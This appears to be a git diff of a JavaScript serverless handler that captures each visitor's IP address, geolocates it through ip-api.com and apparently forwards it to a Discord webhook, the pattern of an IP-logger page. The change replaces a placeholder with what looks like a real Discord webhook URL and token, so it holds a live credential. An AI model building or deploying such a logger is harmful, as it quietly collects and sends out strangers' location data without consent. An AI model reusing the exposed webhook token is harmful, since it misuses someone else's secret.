@@ -3,7 +3,7 @@ export default async function handler(req, res) {
         req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
     const ipAPI = `http://ip-api.com/json/${ip}`;
-    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace this
+    const webhookURL = "https://discord.com/api/webhooks/1376717625169543228/-M_cKWR5l4Xra3BALwxfrjsWKedUdUV-6focu5z9ohrHZI8bq7YAnRNtdIuKUjdypJ9J"; // Replace this
 
     try {
         const response = await fetch(ipAPI);
